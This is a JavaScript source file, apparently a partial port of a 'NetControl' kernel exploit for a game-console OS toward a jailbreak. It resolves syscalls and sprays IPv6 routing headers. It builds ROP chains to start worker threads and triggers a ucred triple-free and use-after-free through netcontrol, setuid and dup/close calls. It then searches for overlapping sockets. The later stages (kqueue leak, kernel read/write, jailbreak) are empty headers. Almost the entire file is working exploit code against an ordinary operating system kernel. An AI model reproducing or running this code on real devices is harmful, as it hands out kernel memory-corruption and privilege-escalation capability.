include('inject.js')
include('globals.js')
include('util.js')

// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// ============================================================================
utils.notify('NetControl ð\x9F\x92\xA9 ð\x9F\x92\xA9')

// Extract required syscalls from syscalls.map
var kapi = {
  read_lo: 0,
  read_hi: 0,
  read_found: false,
  write_lo: 0,
  write_hi: 0,
  write_found: false,
  close_lo: 0,
  close_hi: 0,
  close_found: false,
  setuid_lo: 0,
  setuid_hi: 0,
  setuid_found: false,
  dup_lo: 0,
  dup_hi: 0,
  dup_found: false,
  socket_lo: 0,
  socket_hi: 0,
  socket_found: false,
  socketpair_lo: 0,
  socketpair_hi: 0,
  socketpair_found: false,
  recvmsg_lo: 0,
  recvmsg_hi: 0,
  recvmsg_found: false,
  setsockopt_lo: 0,
  setsockopt_hi: 0,
  setsockopt_found: false,
  getsockopt_lo: 0,
  getsockopt_hi: 0,
  getsockopt_found: false,
  netcontrol_lo: 0,
  netcontrol_hi: 0,
  netcontrol_found: false,
  mprotect_lo: 0,
  mprotect_hi: 0,
  mprotect_found: false
}

// Get syscall addresses from already-scanned syscalls.map
if (syscalls.map.has(0x03)) {
  var addr = syscalls.map.get(0x03)
  kapi.read_lo = addr.lo()
  kapi.read_hi = addr.hi()
  kapi.read_found = true
}
if (syscalls.map.has(0x04)) {
  var addr = syscalls.map.get(0x04)
  kapi.write_lo = addr.lo()
  kapi.write_hi = addr.hi()
  kapi.write_found = true
}
if (syscalls.map.has(0x06)) {
  var addr = syscalls.map.get(0x06)
  kapi.close_lo = addr.lo()
  kapi.close_hi = addr.hi()
  kapi.close_found = true
}
if (syscalls.map.has(0x17)) {
  var addr = syscalls.map.get(0x17)
  kapi.setuid_lo = addr.lo()
  kapi.setuid_hi = addr.hi()
  kapi.setuid_found = true
}
if (syscalls.map.has(0x29)) {
  var addr = syscalls.map.get(0x29)
  kapi.dup_lo = addr.lo()
  kapi.dup_hi = addr.hi()
  kapi.dup_found = true
}
if (syscalls.map.has(0x61)) {
  var addr = syscalls.map.get(0x61)
  kapi.socket_lo = addr.lo()
  kapi.socket_hi = addr.hi()
  kapi.socket_found = true
}
if (syscalls.map.has(0x87)) {
  var addr = syscalls.map.get(0x87)
  kapi.socketpair_lo = addr.lo()
  kapi.socketpair_hi = addr.hi()
  kapi.socketpair_found = true
}
if (syscalls.map.has(0x1B)) {
  var addr = syscalls.map.get(0x1B)
  kapi.recvmsg_lo = addr.lo()
  kapi.recvmsg_hi = addr.hi()
  kapi.recvmsg_found = true
}
if (syscalls.map.has(0x69)) {
  var addr = syscalls.map.get(0x69)
  kapi.setsockopt_lo = addr.lo()
  kapi.setsockopt_hi = addr.hi()
  kapi.setsockopt_found = true
}
if (syscalls.map.has(0x76)) {
  var addr = syscalls.map.get(0x76)
  kapi.getsockopt_lo = addr.lo()
  kapi.getsockopt_hi = addr.hi()
  kapi.getsockopt_found = true
}
if (syscalls.map.has(0x63)) {
  var addr = syscalls.map.get(0x63)
  kapi.netcontrol_lo = addr.lo()
  kapi.netcontrol_hi = addr.hi()
  kapi.netcontrol_found = true
}
if (syscalls.map.has(0x4A)) {
  var addr = syscalls.map.get(0x4A)
  kapi.mprotect_lo = addr.lo()
  kapi.mprotect_hi = addr.hi()
  kapi.mprotect_found = true
}

// Check required syscalls
if (!kapi.socket_found || !kapi.socketpair_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found || !kapi.netcontrol_found || !kapi.read_found || !kapi.write_found || !kapi.recvmsg_found) {
  log('ERROR: Required syscalls not found')
  log(' socket: ' + kapi.socket_found)
  log(' socketpair: ' + kapi.socketpair_found)
  log(' setsockopt: ' + kapi.setsockopt_found)
  log(' getsockopt: ' + kapi.getsockopt_found)
  log(' close: ' + kapi.close_found)
  log(' netcontrol: ' + kapi.netcontrol_found)
  log(' read: ' + kapi.read_found)
  log(' write: ' + kapi.write_found)
  log(' recvmsg: ' + kapi.recvmsg_found)
  log(' setuid: ' + kapi.setuid_found)
  throw new Error('Required syscalls not found')
}

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// ============================================================================

log('=== NetControl ===')

// Create syscall wrappers using fn.create()
var socket = fn.create(0x61, ['bigint', 'bigint', 'bigint'], 'bigint')
var socketpair = fn.create(0x87, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var setsockopt = fn.create(0x69, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var getsockopt = fn.create(0x76, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var close_sys = fn.create(0x06, ['bigint'], 'bigint')
var setuid = fn.create(0x17, ['bigint'], 'bigint')
var dup_sys = fn.create(0x29, ['bigint'], 'bigint')
var recvmsg = fn.create(0x1B, ['bigint', 'bigint', 'bigint'], 'bigint')
var netcontrol = fn.create(0x63, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
var read_sys = fn.create(0x03, ['bigint', 'bigint', 'bigint'], 'bigint')
var write_sys = fn.create(0x04, ['bigint', 'bigint', 'bigint'], 'bigint')

// Extract wrapper addresses for ROP chains (pthread workers)
var read_wrapper = read_sys.addr
var write_wrapper = write_sys.addr
var recvmsg_wrapper = recvmsg.addr

// Get pthread_create address from libkernel
var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))

log('Created syscall wrappers via fn.create()')
log('pthread_create at: ' + pthread_create_addr.toString())

// Pre-allocate all buffers once (reuse throughout exploit)
var store_addr = mem.malloc(0x100)
var rthdr_buf = mem.malloc(UCRED_SIZE)
var optlen_buf = mem.malloc(8)

log('store_addr: ' + store_addr.toString())
log('rthdr_buf: ' + rthdr_buf.toString())

// Storage for IPv6 sockets
var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
var socket_count = 0

log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets using socket()
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var fd = socket(AF_INET6, SOCK_STREAM, 0)

  if (fd === -1) {
    log('ERROR: socket() failed at index ' + i)
    break
  }

  ipv6_sockets[i] = fd
  socket_count++
}

log('Created ' + socket_count + ' IPv6 sockets')

if (socket_count !== IPV6_SOCK_NUM) {
  log('FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}

log('Initializing pktopts on all sockets...')

// Initialize pktopts by calling setsockopt with NULL buffer
var init_count = 0
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var ret = setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)

  if (ret !== -1) {
    init_count++
  }
}

log('Initialized ' + init_count + ' pktopts')

if (init_count === 0) {
  log('FAILED: No pktopts initialized')
  throw new Error('Failed to initialize pktopts')
}

// ============================================================================
// STAGE 2: Spray routing headers
// ============================================================================

// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.write1(rthdr_buf, 0) // ip6r_nxt
mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len) // ip6r_len
mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0) // ip6r_type
mem.write1(rthdr_buf.add(new BigInt(0, 3)), rthdr_len >> 1) // ip6r_segleft
var rthdr_size = (rthdr_len + 1) << 3

log('Built routing header template (size=' + rthdr_size + ' bytes)')

// Spray routing headers with tagged values across all sockets
log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')

for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
  mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)

  // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
}

log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')

// ============================================================================
// STAGE 3: Trigger ucred triple-free and find twins/triplet
// ============================================================================

// Allocate buffers
var set_buf = mem.malloc(8)
var clear_buf = mem.malloc(8)
var leak_rthdr_buf = mem.malloc(UCRED_SIZE)
var leak_len_buf = mem.malloc(8)
var tmp_buf = mem.malloc(8)

// Global variables
var twins = [-1, -1]
var triplets = [-1, -1, -1]
var uaf_sock = -1

// Try socketpair using fn.create() approach
log('Attempting socketpair...')

var sp_buf = mem.malloc(8)
log('Allocated socketpair buffer at: ' + sp_buf.toString())

socketpair(1, 1, 0, sp_buf)

var iov_ss0 = mem.read4(sp_buf).lo() & 0xFFFFFFFF
var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF

if (iov_ss0 === 0xFFFFFFFF || iov_ss1 === 0xFFFFFFFF) {
  var errno_val = _error()
  var errno_int = mem.read4(errno_val)
  var errno_str = strerror(errno_int)
  log('ERROR: socketpair failed')
  log('  errno: ' + errno_int + ' (' + errno_str + ')')
  log('  fds: [' + iov_ss0 + ', ' + iov_ss1 + ']')
  throw new Error('socketpair failed with errno ' + errno_int)
}

log('SUCCESS! Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')

// Prepare msg_iov buffer (iov_base=1 will become cr_refcnt)
var msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (var i = 0; i < MSG_IOV_NUM; i++) {
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE)), new BigInt(0, 1))
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
}

// Spawn IOV workers only if socketpair succeeded
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  log('Spawning IOV worker threads...')

  // Prepare msghdr for recvmsg
  var msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)
  mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)

  // Create UNIX sockets for each worker (for recvmsg spray)
  var worker_sockets = []
  for (var w = 0; w < IOV_THREAD_NUM; w++) {
    var worker_sock_fd = socket(AF_UNIX, SOCK_STREAM, 0).lo() & 0xFFFFFFFF
    worker_sockets.push(worker_sock_fd)
  }
  log('Created ' + IOV_THREAD_NUM + ' sockets for worker recvmsg spray: ' + worker_sockets.join(', '))

  var iov_workers = []
  for (var w = 0; w < IOV_THREAD_NUM; w++) {
    var worker_rop = mem.malloc(0x2000)
    var worker_rop_arr = []
    var worker_sock = worker_sockets[w]

    var loop_label = worker_rop.add(new BigInt(0, worker_rop_arr.length * 8))

    // read(pipe_read, tmp_buf, 8) - wait for signal from main thread
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, iov_ss0))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(tmp_buf)
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, 8))
    worker_rop_arr.push(read_wrapper)

    // recvmsg(worker_sock, msg_hdr, 0) - spray IOV structures
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, worker_sock))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(msg_hdr)
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, 0))
    worker_rop_arr.push(recvmsg_wrapper)

    // write(pipe_write, tmp_buf, 8) - signal completion to main thread
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, iov_ss1))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(tmp_buf)
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, 8))
    worker_rop_arr.push(write_wrapper)

    // Loop back
    worker_rop_arr.push(loop_label)

    for (var r = 0; r < worker_rop_arr.length; r++) {
      mem.write8(worker_rop.add(new BigInt(0, r * 8)), worker_rop_arr[r])
    }

    var worker_func = mem.malloc(0x10)
    mem.write8(worker_func, gadgets.RET)
    mem.write8(worker_func.add(new BigInt(0, 8)), worker_rop)

    var pthread_addr = mem.malloc(8)
    var thread_name = mem.malloc(16)
    mem.write1(thread_name, 0x69)
    mem.write1(thread_name.add(new BigInt(0, 1)), 0x6F)
    mem.write1(thread_name.add(new BigInt(0, 2)), 0x76)
    mem.write1(thread_name.add(new BigInt(0, 3)), 0x5F)
    mem.write1(thread_name.add(new BigInt(0, 4)), 0x30 + w)
    mem.write1(thread_name.add(new BigInt(0, 5)), 0)

    var pthread_store = mem.malloc(0x100)
    var pthread_insts = build_rop_chain(
      pthread_create_addr,
      pthread_addr,
      new BigInt(0, 0),
      worker_func,
      new BigInt(0, 0),
      thread_name
    )
    rop.store(pthread_insts, pthread_store, 1)
    rop.execute(pthread_insts, pthread_store, 0x10)
    mem.free(pthread_store)

    var pthread_id = mem.read8(pthread_addr)
    iov_workers.push(pthread_id)

    if (w === 0 || w === IOV_THREAD_NUM - 1) {
      log('IOV worker ' + (w + 1) + '/' + IOV_THREAD_NUM + ' spawned (pthread=' + pthread_id.toString() + ')')
    }
  }

  log('All IOV workers spawned and waiting')
} else {
  log('Skipping IOV worker spawning (socketpair failed)')
}

// Create dummy socket to register with netcontrol
var dummy_sock = socket(AF_UNIX, SOCK_STREAM, 0)

log('Created dummy socket: fd=' + dummy_sock)

// Register dummy socket with netcontrol
mem.write4(set_buf, dummy_sock)
netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)

log('Registered dummy socket with netcontrol')

// Close dummy socket
close_sys(dummy_sock)

log('Closed dummy socket')

// Allocate new ucred via setuid
setuid(1)

log('Allocated ucred via setuid(1)')

// Reclaim file descriptor with new socket
uaf_sock = socket(AF_UNIX, SOCK_STREAM, 0)

log('Reclaimed fd with UAF socket: fd=' + uaf_sock)

// Free previous ucred via setuid again
setuid(1)

log('Freed ucred via setuid(1)')

// Unregister and trigger final free
mem.write4(clear_buf, uaf_sock)
netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)

log('Unregistered socket (triple-free triggered)')

// IOV spray to set cr_refcnt=1
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  // Use IOV workers
  log('Spraying IOV with workers (32 iterations)...')
  for (var i = 0; i < 32; i++) {
    // Signal workers to spray
    write_sys(iov_ss1, tmp_buf, 8)

    // Wait for workers to complete
    read_sys(iov_ss0, tmp_buf, 8)
  }
  log('IOV spray complete (workers)')
} else {
  // Fallback: synchronous spray without workers
  log('Spraying IOV synchronously (no workers)...')

  var msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)
  mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)

  var spray_sock = socket(AF_UNIX, SOCK_STREAM, 0)

  for (var i = 0; i < 32; i++) {
    recvmsg(spray_sock, msg_hdr, 0x80)
  }
  log('IOV spray complete (synchronous)')
}

// Double free ucred (only dup works - doesn't check f_hold)
var dup_fd = dup_sys(uaf_sock)
close_sys(dup_fd)

log('Double freed ucred via close(dup(uaf_sock))')

// Find twins - two sockets sharing same routing header
var found_twins = false

for (var attempt = 0; attempt < 10 && !found_twins; attempt++) {
  // Re-spray tags across all sockets
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
    setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  }

  // Check for twins
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
    getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

    var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
    var j = val & 0xFFFF

    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
      twins[0] = i
      twins[1] = j
      found_twins = true
      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
      break
    }
  }

  if (!found_twins) {
    log('Twin search attempt ' + (attempt + 1) + '/10...')
  }
}

if (!found_twins) {
  log('FAILED: Could not find twins after 10 attempts')
  throw new Error('Failed to find twins - UAF may have failed')
}

if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  log('Ucred triple-free triggered with ' + IOV_THREAD_NUM + ' IOV spray workers')
} else {
  log('Ucred triple-free triggered with synchronous IOV spray')
}
log('Found twins: socket[' + twins[0] + '] and socket[' + twins[1] + ']')

log('stage 4? UwU')

// Cleanup buffers
mem.free(store_addr)
mem.free(rthdr_buf)
mem.free(optlen_buf)
mem.free(set_buf)
mem.free(clear_buf)
mem.free(leak_rthdr_buf)
mem.free(leak_len_buf)

// ============================================================================
// STAGE 4: Leak kqueue structure
// ============================================================================

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak
// ============================================================================
